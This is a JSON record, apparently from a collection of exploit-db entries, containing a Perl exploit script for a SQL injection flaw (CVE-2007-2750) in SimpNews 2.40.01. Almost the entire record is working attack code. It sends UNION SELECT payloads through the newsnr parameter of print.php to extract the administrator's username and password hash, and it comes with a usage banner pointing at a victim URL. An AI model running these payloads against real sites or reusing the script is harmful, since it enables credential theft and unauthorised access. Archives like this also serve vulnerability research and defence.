{
  "id": "3942",
  "title": "SimpNews 2.40.01 - &#039;newnr&#039; SQL Injection",
  "cve": "CVE-2007-2750",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl -w\r\n\r\n#################################################################################\r\n#                                                                               #\r\n#                    SimpNews <= 2.40.01 SQL Injection Exploit                  #\r\n#                                                                               #\r\n# Discovered by: Silentz                                                        #\r\n# Payload: Admin Username & Hash Retrieval                                      #\r\n# Website: http://www.w4ck1ng.com                                               #\r\n#                                                                               #\r\n# Vulnerable Code (print.php):                                                  #\r\n#                                                                               #\r\n#      $sql = \"select * from \".$tableprefix.\"_data where newsnr=$newsnr\";       #\r\n#                                                                               #\r\n# PoC: http://victim.com/simpnews/print.php?lang=en&layout=def&newsnr=-999      #\r\n#      UNION SELECT 0,0,0,password,username,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,    #\r\n#      0,0,0 FROM simpnews_users WHERE usernr=1                                 #\r\n#                                                                               #\r\n# Subject To: magic_quotes_gpc set to off                                       #\r\n# GoogleDork: Get your own!                                                     #\r\n#                                                                               #\r\n# Shoutz: The entire w4ck1ng community\t\t\t                        #\r\n#                                                                               #\r\n#################################################################################\r\n\r\nuse LWP::UserAgent;\r\n\r\nif (@ARGV < 1){\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"                 SimpNews <= 2.40.01 SQL Injection Exploit\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"Usage: w4ck1ng_simpnews.pl [PATH]\\r\\n\\r\\n\";\r\nprint \"[PATH] = Path where SimpNews is located\\r\\n\\r\\n\";\r\nprint \"e.g. w4ck1ng_simpnews.pl http://victim.com/simpnews/\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"            \t\t http://www.w4ck1ng.com\\r\\n\";\r\nprint \"            \t\t        ...Silentz\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nexit();\r\n}\r\n\r\n$b = LWP::UserAgent->new() or die \"Could not initialize browser\\n\";\r\n$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');\r\n\r\n@paths = (\r\n\"print.php?lang=en&newsnr=-999 UNION SELECT 0,0,0,password,username,username,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 FROM simpnews_users WHERE usernr=1\",\r\n\"print.php?lang=en&newsnr=-999 UNION SELECT 0,0,0,password,username,username,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 FROM simpnews_users WHERE usernr=1\",\r\n\"print.php?lang=en&newsnr=-999 UNION SELECT 0,0,0,password,username,username,0,0,0,0,0,0,0,0,0,0,0,0,0 FROM simpnews_users WHERE usernr=1\",\r\n\"print.php?lang=en&layout=def&newsnr=-999 UNION SELECT 0,0,0,password,username,username,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 FROM simpnews_users WHERE usernr=1\",\r\n\"print.php?lang=en&layout=def&newsnr=-999 UNION SELECT 0,0,0,password,username,username,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 FROM simpnews_users WHERE usernr=1\",\r\n\"print.php?lang=en&layout=def&newsnr=-999 UNION SELECT 0,0,0,password,username,username,0,0,0,0,0,0,0,0,0,0,0,0,0 FROM simpnews_users WHERE usernr=1\"\r\n);\r\n\r\nfor($i=0;$i<6;$i++){\r\n  $host = $ARGV[0] . $paths[$i];\r\n  $res = $b->request(HTTP::Request->new(GET=>$host));\r\n  ($user) = $res->content =~ /poster: (.*?)<\\/font><\\/td><\\/tr>/;\r\n  ($hash) = $res->content =~ /([0-9a-fA-F]{32})<\\/font>/;\r\n  if($hash){ last; }\r\n}\r\n\r\nif($user && $hash){\r\n\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"                 SimpNews <= 2.40.01 SQL Injection Exploit\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"[+] Admin User : $user\\n\";\r\nprint \"[+] Admin Hash : $hash\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"            \t\t http://www.w4ck1ng.com\\r\\n\";\r\nprint \"            \t\t        ...Silentz\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\n} else {\r\n  print \"\\nExploit Failed...\\n\";\r\n}\r\n\r\n# milw0rm.com [2007-05-16]",
  "url": "https://www.exploit-db.com/exploits/3942"
}